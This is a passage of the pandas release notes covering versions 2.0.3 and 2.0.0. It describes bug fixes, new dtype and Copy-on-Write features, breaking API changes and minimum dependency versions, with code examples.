(June 28, 2023)\n-----------------------------------\n\nThese are the changes in pandas 2.0.3. See :ref:`release` for a full changelog\nincluding other versions of pandas.\n\n{{ header }}\n\n.. ---------------------------------------------------------------------------\n.. _whatsnew_203.regressions:\n\nFixed regressions\n~~~~~~~~~~~~~~~~~\n- Bug in :meth:`Timestamp.weekday`` was returning incorrect results before ``'0000-02-29'`` (:issue:`53738`)\n- Fixed performance regression in merging on datetime-like columns (:issue:`53231`)\n- Fixed regression when :meth:`DataFrame.to_string` creates extra space for string dtypes (:issue:`52690`)\n\n.. ---------------------------------------------------------------------------\n.. _whatsnew_203.bug_fixes:\n\nBug fixes\n~~~~~~~~~\n- Bug in :func:`DataFrame.convert_dtype` and :func:`Series.convert_dtype` when trying to convert :class:`ArrowDtype` with ``dtype_backend=\"nullable_numpy\"`` (:issue:`53648`)\n- Bug in :func:`RangeIndex.union` when using ``sort=True`` with another :class:`RangeIndex` (:issue:`53490`)\n- Bug in :func:`Series.reindex` when expanding a non-nanosecond datetime or timedelta :class:`Series` would not fill with ``NaT`` correctly (:issue:`53497`)\n- Bug in :func:`read_csv` when defining ``dtype`` with ``bool[pyarrow]`` for the ``\"c\"`` and ``\"python\"`` engines (:issue:`53390`)\n- Bug in :meth:`Series.str.split` and :meth:`Series.str.rsplit` with ``expand=True`` for :class:`ArrowDtype` with ``pyarrow.string`` (:issue:`53532`)\n- Bug in indexing methods (e.g. :meth:`DataFrame.__getitem__`) where taking the entire :class:`DataFrame`/:class:`Series` would raise an ``OverflowError`` when Copy on Write was enabled and the length of the array was over the maximum size a 32-bit integer can hold (:issue:`53616`)\n- Bug when constructing a :class:`DataFrame` with columns of an :class:`ArrowDtype` with a ``pyarrow.dictionary`` type that reindexes the data (:issue:`53617`)\n- Bug when indexing a :class:`DataFrame` or :class:`Series` with an :class:`Index` with a timestamp :class:`ArrowDtype` would raise an ``AttributeError`` (:issue:`53644`)\n\n.. ---------------------------------------------------------------------------\n.. _whatsnew_203.other:\n\nOther\n~~~~~\n\n.. ---------------------------------------------------------------------------\n.. _whatsnew_203.contributors:\n\nContributors\n~~~~~~~~~~~~\n\n.. contributors:: v2.0.2..v2.0.3\n\n\n.. _whatsnew_200:\n\nWhat's new in 2.0.0 (April 3, 2023)\n-----------------------------------\n\nThese are the changes in pandas 2.0.0. See :ref:`release` for a full changelog\nincluding other versions of pandas.\n\n{{ header }}\n\n.. ---------------------------------------------------------------------------\n.. _whatsnew_200.enhancements:\n\nEnhancements\n~~~~~~~~~~~~\n\n.. _whatsnew_200.enhancements.optional_dependency_management_pip:\n\nInstalling optional dependencies with pip extras\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\nWhen installing pandas using pip, sets of optional dependencies can also be installed by specifying extras.\n\n.. code-block:: bash\n\n  pip install \"pandas[performance, aws]>=2.0.0\"\n\nThe available extras, found in the :ref:`installation guide<install.dependencies>`, are\n``[all, performance, computation, fss, aws, gcp, excel, parquet, feather, hdf5, spss, postgresql, mysql,\nsql-other, html, xml, plot, output_formatting, clipboard, compression, test]`` (:issue:`39164`).\n\n.. _whatsnew_200.enhancements.index_can_hold_numpy_numeric_dtypes:\n\n:class:`Index` can now hold numpy numeric dtypes\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nIt is now possible to use any numpy numeric dtype in a :class:`Index` (:issue:`42717`).\n\nPreviously it was only possible to use ``int64``, ``uint64`` & ``float64`` dtypes:\n\n.. code-block:: ipython\n\n    In [1]: pd.Index([1, 2, 3], dtype=np.int8)\n    Out[1]: Int64Index([1, 2, 3], dtype=\"int64\")\n    In [2]: pd.Index([1, 2, 3], dtype=np.uint16)\n    Out[2]: UInt64Index([1, 2, 3], dtype=\"uint64\")\n    In [3]: pd.Index([1, 2, 3], dtype=np.float32)\n    Out[3]: Float64Index([1.0, 2.0, 3.0], dtype=\"float64\")\n\n:class:`Int64Index`, :class:`UInt64Index` & :class:`Float64Index` were deprecated in pandas\nversion 1.4 and have now been removed. Instead :class:`Index` should be used directly, and\ncan it now take all numpy numeric dtypes, i.e.\n``int8``/ ``int16``/``int32``/``int64``/``uint8``/``uint16``/``uint32``/``uint64``/``float32``/``float64`` dtypes:\n\n.. ipython:: python\n\n    pd.Index([1, 2, 3], dtype=np.int8)\n    pd.Index([1, 2, 3], dtype=np.uint16)\n    pd.Index([1, 2, 3], dtype=np.float32)\n\nThe ability for :class:`Index` to hold the numpy numeric dtypes has meant some changes in Pandas\nfunctionality. In particular, operations that previously were forced to create 64-bit indexes,\ncan now create indexes with lower bit sizes, e.g. 32-bit indexes.\n\nBelow is a possibly non-exhaustive list of changes:\n\n1. Instantiating using a numpy numeric array now follows the dtype of the numpy array.\n   Previously, all indexes created from numpy numeric arrays were forced to 64-bit. Now,\n   for example, ``Index(np.array([1, 2, 3]))`` will be ``int32`` on 32-bit systems, where\n   it previously would have been ``int64`` even on 32-bit systems.\n   Instantiating :class:`Index` using a list of numbers will still return 64bit dtypes,\n   e.g. ``Index([1, 2, 3])`` will have a ``int64`` dtype, which is the same as previously.\n2. The various numeric datetime attributes of :class:`DatetimeIndex` (:attr:`~DatetimeIndex.day`,\n   :attr:`~DatetimeIndex.month`, :attr:`~DatetimeIndex.year` etc.) were previously in of\n   dtype ``int64``, while they were ``int32`` for :class:`arrays.DatetimeArray`. They are now\n   ``int32`` on :class:`DatetimeIndex` also:\n\n   .. ipython:: python\n\n       idx = pd.date_range(start='1/1/2018', periods=3, freq='ME')\n       idx.array.year\n       idx.year\n\n3. Level dtypes on Indexes from :meth:`Series.sparse.from_coo` are now of dtype ``int32``,\n   the same as they are on the ``rows``/``cols`` on a scipy sparse matrix. Previously they\n   were of dtype ``int64``.\n\n   .. ipython:: python\n\n       from scipy import sparse\n       A = sparse.coo_matrix(\n           ([3.0, 1.0, 2.0], ([1, 0, 0], [0, 2, 3])), shape=(3, 4)\n       )\n       ser = pd.Series.sparse.from_coo(A)\n       ser.index.dtypes\n\n4. :class:`Index` cannot be instantiated using a float16 dtype. Previously instantiating\n   an :class:`Index` using dtype ``float16`` resulted in a :class:`Float64Index` with a\n   ``float64`` dtype. It now raises a ``NotImplementedError``:\n\n   .. ipython:: python\n       :okexcept:\n\n       pd.Index([1, 2, 3], dtype=np.float16)\n\n\n.. _whatsnew_200.enhancements.io_dtype_backend:\n\nArgument ``dtype_backend``, to return pyarrow-backed or numpy-backed nullable dtypes\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nThe following functions gained a new keyword ``dtype_backend`` (:issue:`36712`)\n\n* :func:`read_csv`\n* :func:`read_clipboard`\n* :func:`read_fwf`\n* :func:`read_excel`\n* :func:`read_html`\n* :func:`read_xml`\n* :func:`read_json`\n* :func:`read_sql`\n* :func:`read_sql_query`\n* :func:`read_sql_table`\n* :func:`read_parquet`\n* :func:`read_orc`\n* :func:`read_feather`\n* :func:`read_spss`\n* :func:`to_numeric`\n* :meth:`DataFrame.convert_dtypes`\n* :meth:`Series.convert_dtypes`\n\nWhen this option is set to ``\"numpy_nullable\"`` it will return a :class:`DataFrame` that is\nbacked by nullable dtypes.\n\nWhen this keyword is set to ``\"pyarrow\"``, then these functions will return pyarrow-backed nullable :class:`ArrowDtype` DataFrames (:issue:`48957`, :issue:`49997`):\n\n* :func:`read_csv`\n* :func:`read_clipboard`\n* :func:`read_fwf`\n* :func:`read_excel`\n* :func:`read_html`\n* :func:`read_xml`\n* :func:`read_json`\n* :func:`read_sql`\n* :func:`read_sql_query`\n* :func:`read_sql_table`\n* :func:`read_parquet`\n* :func:`read_orc`\n* :func:`read_feather`\n* :func:`read_spss`\n* :func:`to_numeric`\n* :meth:`DataFrame.convert_dtypes`\n* :meth:`Series.convert_dtypes`\n\n.. ipython:: python\n\n    import io\n    data = io.StringIO(\"\"\"a,b,c,d,e,f,g,h,i\n        1,2.5,True,a,,,,,\n        3,4.5,False,b,6,7.5,True,a,\n    \"\"\")\n    df = pd.read_csv(data, dtype_backend=\"pyarrow\")\n    df.dtypes\n\n    data.seek(0)\n    df_pyarrow = pd.read_csv(data, dtype_backend=\"pyarrow\", engine=\"pyarrow\")\n    df_pyarrow.dtypes\n\nCopy-on-Write improvements\n^^^^^^^^^^^^^^^^^^^^^^^^^^\n\n- A new lazy copy mechanism that defers the copy until the object in question is modified\n  was added to the methods listed in\n  :ref:`Copy-on-Write optimizations <copy_on_write.optimizations>`.\n  These methods return views when Copy-on-Write is enabled, which provides a significant\n  performance improvement compared to the regular execution (:issue:`49473`).\n\n- Accessing a single column of a DataFrame as a Series (e.g. ``df[\"col\"]``) now always\n  returns a new object every time it is constructed when Copy-on-Write is enabled (not\n  returning multiple times an identical, cached Series object). This ensures that those\n  Series objects correctly follow the Copy-on-Write rules (:issue:`49450`)\n\n- The :class:`Series` constructor will now create a lazy copy (deferring the copy until\n  a modification to the data happens) when constructing a Series from an existing\n  Series with the default of ``copy=False`` (:issue:`50471`)\n\n- The :class:`DataFrame` constructor will now create a lazy copy (deferring the copy until\n  a modification to the data happens) when constructing from an existing\n  :class:`DataFrame` with the default of ``copy=False`` (:issue:`51239`)\n\n- The :class:`DataFrame` constructor, when constructing a DataFrame from a dictionary\n  of Series objects and specifying ``copy=False``, will now use a lazy copy\n  of those Series objects for the columns of the DataFrame (:issue:`50777`)\n\n- The :class:`DataFrame` constructor, when constructing a DataFrame from a\n  :class:`Series` or :class:`Index` and specifying ``copy=False``, will\n  now respect Copy-on-Write.\n\n- The :class:`DataFrame` and :class:`Series` constructors, when constructing from\n  a NumPy array, will now copy the array by default to avoid mutating\n  the :class:`DataFrame` / :class:`Series`\n  when mutating the array. Specify ``copy=False`` to get the old behavior.\n  When setting ``copy=False`` pandas does not guarantee correct Copy-on-Write\n  behavior when the NumPy array is modified after creation of the\n  :class:`DataFrame` / :class:`Series`.\n\n- The :meth:`DataFrame.from_records` will now respect Copy-on-Write when called\n  with a :class:`DataFrame`.\n\n- Trying to set values using chained assignment (for example, ``df[\"a\"][1:3] = 0``)\n  will now always raise a warning when Copy-on-Write is enabled. In this mode,\n  chained assignment can never work because we are always setting into a temporary\n  object that is the result of an indexing operation (getitem), which under\n  Copy-on-Write always behaves as a copy. Thus, assigning through a chain\n  can never update the original Series or DataFrame. Therefore, an informative\n  warning is raised to the user to avoid silently doing nothing (:issue:`49467`)\n\n- :meth:`DataFrame.replace` will now respect the Copy-on-Write mechanism\n  when ``inplace=True``.\n\n- :meth:`DataFrame.transpose` will now respect the Copy-on-Write mechanism.\n\n- Arithmetic operations that can be inplace, e.g. ``ser *= 2`` will now respect the\n  Copy-on-Write mechanism.\n\n- :meth:`DataFrame.__getitem__` will now respect the Copy-on-Write mechanism when the\n  :class:`DataFrame` has :class:`MultiIndex` columns.\n\n- :meth:`Series.__getitem__` will now respect the Copy-on-Write mechanism when the\n   :class:`Series` has a :class:`MultiIndex`.\n\n- :meth:`Series.view` will now respect the Copy-on-Write mechanism.\n\nCopy-on-Write can be enabled through one of\n\n.. code-block:: python\n\n    pd.set_option(\"mode.copy_on_write\", True)\n\n\n.. code-block:: python\n\n    pd.options.mode.copy_on_write = True\n\nAlternatively, copy on write can be enabled locally through:\n\n.. code-block:: python\n\n    with pd.option_context(\"mode.copy_on_write\", True):\n        ...\n\n.. _whatsnew_200.enhancements.other:\n\nOther enhancements\n^^^^^^^^^^^^^^^^^^\n- Added support for ``str`` accessor methods when using :class:`ArrowDtype`  with a ``pyarrow.string`` type (:issue:`50325`)\n- Added support for ``dt`` accessor methods when using :class:`ArrowDtype` with a ``pyarrow.timestamp`` type (:issue:`50954`)\n- :func:`read_sas` now supports using ``encoding='infer'`` to correctly read and use the encoding specified by the sas file. (:issue:`48048`)\n- :meth:`.DataFrameGroupBy.quantile`, :meth:`.SeriesGroupBy.quantile` and :meth:`.DataFrameGroupBy.std` now preserve nullable dtypes instead of casting to numpy dtypes (:issue:`37493`)\n- :meth:`.DataFrameGroupBy.std`, :meth:`.SeriesGroupBy.std` now support datetime64, timedelta64, and :class:`DatetimeTZDtype` dtypes (:issue:`48481`)\n- :meth:`Series.add_suffix`, :meth:`DataFrame.add_suffix`, :meth:`Series.add_prefix` and :meth:`DataFrame.add_prefix` support an ``axis`` argument. If ``axis`` is set, the default behaviour of which axis to consider can be overwritten (:issue:`47819`)\n- :func:`.testing.assert_frame_equal` now shows the first element where the DataFrames differ, analogously to ``pytest``'s output (:issue:`47910`)\n- Added ``index`` parameter to :meth:`DataFrame.to_dict` (:issue:`46398`)\n- Added support for extension array dtypes in :func:`merge` (:issue:`44240`)\n- Added metadata propagation for binary operators on :class:`DataFrame` (:issue:`28283`)\n- Added ``cumsum``, ``cumprod``, ``cummin`` and ``cummax`` to the ``ExtensionArray`` interface via ``_accumulate`` (:issue:`28385`)\n- :class:`.CategoricalConversionWarning`, :class:`.InvalidComparison`, :class:`.InvalidVersion`, :class:`.LossySetitemError`, and :class:`.NoBufferPresent` are now exposed in ``pandas.errors`` (:issue:`27656`)\n- Fix ``test`` optional_extra by adding missing test package ``pytest-asyncio`` (:issue:`48361`)\n- :func:`DataFrame.astype` exception message thrown improved to include column name when type conversion is not possible. (:issue:`47571`)\n- :func:`date_range` now supports a ``unit`` keyword (\"s\", \"ms\", \"us\", or \"ns\") to specify the desired resolution of the output index (:issue:`49106`)\n- :func:`timedelta_range` now supports a ``unit`` keyword (\"s\", \"ms\", \"us\", or \"ns\") to specify the desired resolution of the output index (:issue:`49824`)\n- :meth:`DataFrame.to_json` now supports a ``mode`` keyword with supported inputs 'w' and 'a'. Defaulting to 'w', 'a' can be used when lines=True and orient='records' to append record oriented json lines to an existing json file. (:issue:`35849`)\n- Added ``name`` parameter to :meth:`IntervalIndex.from_breaks`, :meth:`IntervalIndex.from_arrays` and :meth:`IntervalIndex.from_tuples` (:issue:`48911`)\n- Improve exception message when using :func:`.testing.assert_frame_equal` on a :class:`DataFrame` to include the column that is compared (:issue:`50323`)\n- Improved error message for :func:`merge_asof` when join-columns were duplicated (:issue:`50102`)\n- Added support for extension array dtypes to :func:`get_dummies` (:issue:`32430`)\n- Added :meth:`Index.infer_objects` analogous to :meth:`Series.infer_objects` (:issue:`50034`)\n- Added ``copy`` parameter to :meth:`Series.infer_objects` and :meth:`DataFrame.infer_objects`, passing ``False`` will avoid making copies for series or columns that are already non-object or where no better dtype can be inferred (:issue:`50096`)\n- :meth:`DataFrame.plot.hist` now recognizes ``xlabel`` and ``ylabel`` arguments (:issue:`49793`)\n- :meth:`Series.drop_duplicates` has gained ``ignore_index`` keyword to reset index (:issue:`48304`)\n- :meth:`Series.dropna` and :meth:`DataFrame.dropna` has gained ``ignore_index`` keyword to reset index (:issue:`31725`)\n- Improved error message in :func:`to_datetime` for non-ISO8601 formats, informing users about the position of the first error (:issue:`50361`)\n- Improved error message when trying to align :class:`DataFrame` objects (for example, in :func:`DataFrame.compare`) to clarify that \"identically labelled\" refers to both index and columns (:issue:`50083`)\n- Added support for :meth:`Index.min` and :meth:`Index.max` for pyarrow string dtypes (:issue:`51397`)\n- Added :meth:`DatetimeIndex.as_unit` and :meth:`TimedeltaIndex.as_unit` to convert to different resolutions; supported resolutions are \"s\", \"ms\", \"us\", and \"ns\" (:issue:`50616`)\n- Added :meth:`Series.dt.unit` and :meth:`Series.dt.as_unit` to convert to different resolutions; supported resolutions are \"s\", \"ms\", \"us\", and \"ns\" (:issue:`51223`)\n- Added new argument ``dtype`` to :func:`read_sql` to be consistent with :func:`read_sql_query` (:issue:`50797`)\n- :func:`read_csv`, :func:`read_table`, :func:`read_fwf` and :func:`read_excel` now accept ``date_format`` (:issue:`50601`)\n- :func:`to_datetime` now accepts ``\"ISO8601\"`` as an argument to ``format``, which will match any ISO8601 string (but possibly not identically-formatted) (:issue:`50411`)\n- :func:`to_datetime` now accepts ``\"mixed\"`` as an argument to ``format``, which will infer the format for each element individually (:issue:`50972`)\n- Added new argument ``engine`` to :func:`read_json` to support parsing JSON with pyarrow by specifying ``engine=\"pyarrow\"`` (:issue:`48893`)\n- Added support for SQLAlchemy 2.0 (:issue:`40686`)\n- Added support for ``decimal`` parameter when ``engine=\"pyarrow\"`` in :func:`read_csv` (:issue:`51302`)\n- :class:`Index` set operations :meth:`Index.union`, :meth:`Index.intersection`, :meth:`Index.difference`, and :meth:`Index.symmetric_difference` now support ``sort=True``, which will always return a sorted result, unlike the default ``sort=None`` which does not sort in some cases (:issue:`25151`)\n- Added new escape mode \"latex-math\" to avoid escaping \"$\" in formatter (:issue:`50040`)\n\n.. ---------------------------------------------------------------------------\n.. _whatsnew_200.notable_bug_fixes:\n\nNotable bug fixes\n~~~~~~~~~~~~~~~~~\n\nThese are bug fixes that might have notable behavior changes.\n\n.. _whatsnew_200.notable_bug_fixes.cumsum_cumprod_overflow:\n\n:meth:`.DataFrameGroupBy.cumsum` and :meth:`.DataFrameGroupBy.cumprod` overflow instead of lossy casting to float\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nIn previous versions we cast to float when applying ``cumsum`` and ``cumprod`` which\nlead to incorrect results even if the result could be hold by ``int64`` dtype.\nAdditionally, the aggregation overflows consistent with numpy and the regular\n:meth:`DataFrame.cumprod` and :meth:`DataFrame.cumsum` methods when the limit of\n``int64`` is reached (:issue:`37493`).\n\n*Old Behavior*\n\n.. code-block:: ipython\n\n    In [1]: df = pd.DataFrame({\"key\": [\"b\"] * 7, \"value\": 625})\n    In [2]: df.groupby(\"key\")[\"value\"].cumprod()[5]\n    Out[2]: 5.960464477539062e+16\n\nWe return incorrect results with the 6th value.\n\n*New Behavior*\n\n.. ipython:: python\n\n    df = pd.DataFrame({\"key\": [\"b\"] * 7, \"value\": 625})\n    df.groupby(\"key\")[\"value\"].cumprod()\n\nWe overflow with the 7th value, but the 6th value is still correct.\n\n.. _whatsnew_200.notable_bug_fixes.groupby_nth_filter:\n\n:meth:`.DataFrameGroupBy.nth` and :meth:`.SeriesGroupBy.nth` now behave as filtrations\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nIn previous versions of pandas, :meth:`.DataFrameGroupBy.nth` and\n:meth:`.SeriesGroupBy.nth` acted as if they were aggregations. However, for most\ninputs ``n``, they may return either zero or multiple rows per group. This means\nthat they are filtrations, similar to e.g. :meth:`.DataFrameGroupBy.head`. pandas\nnow treats them as filtrations (:issue:`13666`).\n\n.. ipython:: python\n\n    df = pd.DataFrame({\"a\": [1, 1, 2, 1, 2], \"b\": [np.nan, 2.0, 3.0, 4.0, 5.0]})\n    gb = df.groupby(\"a\")\n\n*Old Behavior*\n\n.. code-block:: ipython\n\n    In [5]: gb.nth(n=1)\n    Out[5]:\n       A    B\n    1  1  2.0\n    4  2  5.0\n\n*New Behavior*\n\n.. ipython:: python\n\n    gb.nth(n=1)\n\nIn particular, the index of the result is derived from the input by selecting\nthe appropriate rows. Also, when ``n`` is larger than the group, no rows instead of\n``NaN`` is returned.\n\n*Old Behavior*\n\n.. code-block:: ipython\n\n    In [5]: gb.nth(n=3, dropna=\"any\")\n    Out[5]:\n        B\n    A\n    1 NaN\n    2 NaN\n\n*New Behavior*\n\n.. ipython:: python\n\n    gb.nth(n=3, dropna=\"any\")\n\n.. ---------------------------------------------------------------------------\n.. _whatsnew_200.api_breaking:\n\nBackwards incompatible API changes\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\n.. _whatsnew_200.api_breaking.unsupported_datetimelike_dtype_arg:\n\nConstruction with datetime64 or timedelta64 dtype with unsupported resolution\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\nIn past versions, when constructing a :class:`Series` or :class:`DataFrame` and\npassing a \"datetime64\" or \"timedelta64\" dtype with unsupported resolution\n(i.e. anything other than \"ns\"), pandas would silently replace the given dtype\nwith its nanosecond analogue:\n\n*Previous behavior*:\n\n.. code-block:: ipython\n\n   In [5]: pd.Series([\"2016-01-01\"], dtype=\"datetime64[s]\")\n   Out[5]:\n   0   2016-01-01\n   dtype: datetime64[ns]\n\n   In [6] pd.Series([\"2016-01-01\"], dtype=\"datetime64[D]\")\n   Out[6]:\n   0   2016-01-01\n   dtype: datetime64[ns]\n\nIn pandas 2.0 we support resolutions \"s\", \"ms\", \"us\", and \"ns\". When passing\na supported dtype (e.g. \"datetime64[s]\"), the result now has exactly\nthe requested dtype:\n\n*New behavior*:\n\n.. ipython:: python\n\n   pd.Series([\"2016-01-01\"], dtype=\"datetime64[s]\")\n\nWith an un-supported dtype, pandas now raises instead of silently swapping in\na supported dtype:\n\n*New behavior*:\n\n.. ipython:: python\n   :okexcept:\n\n   pd.Series([\"2016-01-01\"], dtype=\"datetime64[D]\")\n\n.. _whatsnew_200.api_breaking.value_counts:\n\nValue counts sets the resulting name to ``count``\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\nIn past versions, when running :meth:`Series.value_counts`, the result would inherit\nthe original object's name, and the result index would be nameless. This would cause\nconfusion when resetting the index, and the column names would not correspond with the\ncolumn values.\nNow, the result name will be ``'count'`` (or ``'proportion'`` if ``normalize=True`` was passed),\nand the index will be named after the original object (:issue:`49497`).\n\n*Previous behavior*:\n\n.. code-block:: ipython\n\n    In [8]: pd.Series(['quetzal', 'quetzal', 'elk'], name='animal').value_counts()\n\n    Out[2]:\n    quetzal    2\n    elk        1\n    Name: animal, dtype: int64\n\n*New behavior*:\n\n.. ipython:: python\n\n    pd.Series(['quetzal', 'quetzal', 'elk'], name='animal').value_counts()\n\nLikewise for other ``value_counts`` methods (for example, :meth:`DataFrame.value_counts`).\n\n.. _whatsnew_200.api_breaking.astype_to_unsupported_datetimelike:\n\nDisallow astype conversion to non-supported datetime64/timedelta64 dtypes\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\nIn previous versions, converting a :class:`Series` or :class:`DataFrame`\nfrom ``datetime64[ns]`` to a different ``datetime64[X]`` dtype would return\nwith ``datetime64[ns]`` dtype instead of the requested dtype. In pandas 2.0,\nsupport is added for \"datetime64[s]\", \"datetime64[ms]\", and \"datetime64[us]\" dtypes,\nso converting to those dtypes gives exactly the requested dtype:\n\n*Previous behavior*:\n\n.. ipython:: python\n\n   idx = pd.date_range(\"2016-01-01\", periods=3)\n   ser = pd.Series(idx)\n\n*Previous behavior*:\n\n.. code-block:: ipython\n\n   In [4]: ser.astype(\"datetime64[s]\")\n   Out[4]:\n   0   2016-01-01\n   1   2016-01-02\n   2   2016-01-03\n   dtype: datetime64[ns]\n\nWith the new behavior, we get exactly the requested dtype:\n\n*New behavior*:\n\n.. ipython:: python\n\n   ser.astype(\"datetime64[s]\")\n\nFor non-supported resolutions e.g. \"datetime64[D]\", we raise instead of silently\nignoring the requested dtype:\n\n*New behavior*:\n\n.. ipython:: python\n   :okexcept:\n\n   ser.astype(\"datetime64[D]\")\n\nFor conversion from ``timedelta64[ns]`` dtypes, the old behavior converted\nto a floating point format.\n\n*Previous behavior*:\n\n.. ipython:: python\n\n   idx = pd.timedelta_range(\"1 Day\", periods=3)\n   ser = pd.Series(idx)\n\n*Previous behavior*:\n\n.. code-block:: ipython\n\n   In [7]: ser.astype(\"timedelta64[s]\")\n   Out[7]:\n   0     86400.0\n   1    172800.0\n   2    259200.0\n   dtype: float64\n\n   In [8]: ser.astype(\"timedelta64[D]\")\n   Out[8]:\n   0    1.0\n   1    2.0\n   2    3.0\n   dtype: float64\n\nThe new behavior, as for datetime64, either gives exactly the requested dtype or raises:\n\n*New behavior*:\n\n.. ipython:: python\n   :okexcept:\n\n   ser.astype(\"timedelta64[s]\")\n   ser.astype(\"timedelta64[D]\")\n\n.. _whatsnew_200.api_breaking.default_to_stdlib_tzinfos:\n\nUTC and fixed-offset timezones default to standard-library tzinfo objects\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\nIn previous versions, the default ``tzinfo`` object used to represent UTC\nwas ``pytz.UTC``. In pandas 2.0, we default to ``datetime.timezone.utc`` instead.\nSimilarly, for timezones represent fixed UTC offsets, we use ``datetime.timezone``\nobjects instead of ``pytz.FixedOffset`` objects. See (:issue:`34916`)\n\n*Previous behavior*:\n\n.. code-block:: ipython\n\n   In [2]: ts = pd.Timestamp(\"2016-01-01\", tz=\"UTC\")\n   In [3]: type(ts.tzinfo)\n   Out[3]: pytz.UTC\n\n   In [4]: ts2 = pd.Timestamp(\"2016-01-01 04:05:06-07:00\")\n   In [3]: type(ts2.tzinfo)\n   Out[5]: pytz._FixedOffset\n\n*New behavior*:\n\n.. ipython:: python\n\n   ts = pd.Timestamp(\"2016-01-01\", tz=\"UTC\")\n   type(ts.tzinfo)\n\n   ts2 = pd.Timestamp(\"2016-01-01 04:05:06-07:00\")\n   type(ts2.tzinfo)\n\nFor timezones that are neither UTC nor fixed offsets, e.g. \"US/Pacific\", we\ncontinue to default to ``pytz`` objects.\n\n.. _whatsnew_200.api_breaking.zero_len_indexes:\n\nEmpty DataFrames/Series will now default to have a ``RangeIndex``\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nBefore, constructing an empty (where ``data`` is ``None`` or an empty list-like argument) :class:`Series` or :class:`DataFrame` without\nspecifying the axes (``index=None``, ``columns=None``) would return the axes as empty :class:`Index` with object dtype.\n\nNow, the axes return an empty :class:`RangeIndex` (:issue:`49572`).\n\n*Previous behavior*:\n\n.. code-block:: ipython\n\n   In [8]: pd.Series().index\n   Out[8]:\n   Index([], dtype='object')\n\n   In [9] pd.DataFrame().axes\n   Out[9]:\n   [Index([], dtype='object'), Index([], dtype='object')]\n\n*New behavior*:\n\n.. ipython:: python\n\n   pd.Series().index\n   pd.DataFrame().axes\n\n.. _whatsnew_200.api_breaking.to_latex:\n\nDataFrame to LaTeX has a new render engine\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nThe existing :meth:`DataFrame.to_latex` has been restructured to utilise the\nextended implementation previously available under :meth:`.Styler.to_latex`.\nThe arguments signature is similar, albeit ``col_space`` has been removed since\nit is ignored by LaTeX engines. This render engine also requires ``jinja2`` as a\ndependency which needs to be installed, since rendering is based upon jinja2 templates.\n\nThe pandas latex options below are no longer used and have been removed. The generic\nmax rows and columns arguments remain but for this functionality should be replaced\nby the Styler equivalents.\nThe alternative options giving similar functionality are indicated below:\n\n- ``display.latex.escape``: replaced with ``styler.format.escape``,\n- ``display.latex.longtable``: replaced with ``styler.latex.environment``,\n- ``display.latex.multicolumn``, ``display.latex.multicolumn_format`` and\n  ``display.latex.multirow``: replaced with ``styler.sparse.rows``,\n  ``styler.sparse.columns``, ``styler.latex.multirow_align`` and\n  ``styler.latex.multicol_align``,\n- ``display.latex.repr``: replaced with ``styler.render.repr``,\n- ``display.max_rows`` and ``display.max_columns``: replace with\n  ``styler.render.max_rows``, ``styler.render.max_columns`` and\n  ``styler.render.max_elements``.\n\nNote that due to this change some defaults have also changed:\n\n- ``multirow`` now defaults to *True*.\n- ``multirow_align`` defaults to *\"r\"* instead of *\"l\"*.\n- ``multicol_align`` defaults to *\"r\"* instead of *\"l\"*.\n- ``escape`` now defaults to *False*.\n\nNote that the behaviour of ``_repr_latex_`` is also changed. Previously\nsetting ``display.latex.repr`` would generate LaTeX only when using nbconvert for a\nJupyterNotebook, and not when the user is running the notebook. Now the\n``styler.render.repr`` option allows control of the specific output\nwithin JupyterNotebooks for operations (not just on nbconvert). See :issue:`39911`.\n\n.. _whatsnew_200.api_breaking.deps:\n\nIncreased minimum versions for dependencies\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\nSome minimum supported versions of dependencies were updated.\nIf installed, we now require:\n\n+-------------------+-----------------+----------+---------+\n| Package           | Minimum Version | Required | Changed |\n+===================+=================+==========+=========+\n| mypy (dev)        | 1.0             |          |    X    |\n+-------------------+-----------------+----------+---------+\n| pytest (dev)      | 7.0.0           |          |    X    |\n+-------------------+-----------------+----------+---------+\n| pytest-xdist (dev)| 2.2.0           |          |    X    |\n+-------------------+-----------------+----------+---------+\n| hypothesis (dev)  | 6.34.2          |          |    X    |\n+-------------------+-----------------+----------+---------+\n| python-dateutil   | 2.8.2           |    X     |    X    |\n+-------------------+-----------------+----------+---------+\n| tzdata            | 2022.1          |    X     |    X    |\n+-------------------+-----------------+----------+---------+\n\nFor `optional libraries <https://pandas.pydata.org/docs/getting_started/install.html>`_ the general recommendation is to use the latest version.\nThe following table lists the lowest version per library that is currently being tested throughout the development of pandas.\nOptional libraries below the lowest tested version may still work, but are not considered supported.\n\n+-----------------+-----------------+---------+\n| Package         | Minimum Version | Changed |\n+=================+=================+=========+\n| pyarrow         | 7.0.0           |    X    |\n+-----------------+-----------------+---------+\n| matplotlib      | 3.6.1           |    X    |\n+-----------------+-----------------+---------+\n| fastparquet     | 0.6.3           |    X    |\n+-----------------+-----------------+---------+\n| xarray          | 0.21.0          |    X    |\n+-----------------+-----------------+---------+\n\nSee :ref:`install.dependencies` and :ref:`install.optional_dependencies` for more.\n\nDatetimes are now parsed with a consistent 